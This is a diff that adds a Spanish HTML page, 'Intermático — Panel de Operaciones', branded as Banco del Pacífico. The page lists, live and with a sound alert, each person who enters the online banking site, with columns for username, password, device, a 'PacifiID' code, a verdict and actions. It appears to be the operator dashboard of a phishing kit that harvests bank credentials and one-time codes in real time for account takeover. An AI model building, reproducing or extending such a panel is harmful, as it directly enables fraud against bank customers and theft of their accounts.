@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Intermático — Panel de Operaciones</title>
+  <link rel="shortcut icon" href="../assets/icons/pacifico.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../styles/panel.css">
+</head>
+<body>
+  <header class="pl-topbar">
+    <div class="pl-brand">
+      <img class="pl-brand__logo" src="../assets/images/brand-wordmark.webp" alt="Banco del Pacífico">
+    </div>
+    <div class="pl-topbar__meta">
+      <span class="pl-chip pl-chip--live" id="pl-en-vivo" title="Usuarios conectados">
+        <span class="pl-dot"></span> <span id="pl-total">0</span> en vivo
+      </span>
+      <span class="pl-chip" id="pl-reloj">--:--:--</span>
+      <button class="pl-btn pl-btn--ghost pl-sound" id="pl-sonido" aria-pressed="false" title="Activar sonido de notificación">
+        <span class="pl-sound__icon" id="pl-sonido-icono">🔇</span> <span id="pl-sonido-texto">Sonido apagado</span>
+      </button>
+    </div>
+  </header>
+
+  <main class="pl-main">
+    <div class="pl-columnas" id="pl-columnas" hidden>
+      <span class="pl-col-label">Usuario / País</span>
+      <span class="pl-col-label">Usuario</span>
+      <span class="pl-col-label">Contraseña</span>
+      <span class="pl-col-label">Dispositivo</span>
+      <span class="pl-col-label">Código PacifiID</span>
+      <span class="pl-col-label">Veredicto</span>
+      <span class="pl-col-label">Acciones</span>
+    </div>
+
+    <div class="pl-lista" id="pl-lista">
+      <p class="pl-vacio" id="pl-vacio">Aún no hay usuarios conectados. Cuando alguien entre a la Banca Virtual aparecerá aquí, con aviso sonoro.</p>
+    </div>
+  </main>
+
+  <footer class="pl-footer">
+    <span>© Banco del Pacífico — uso interno · Panel de Operaciones</span>
+    <span class="pl-footer__link" id="pl-status">Conectando…</span>
+  </footer>
+
+  <script src="../scripts/panel.js"></script>
+</body>
+</html>
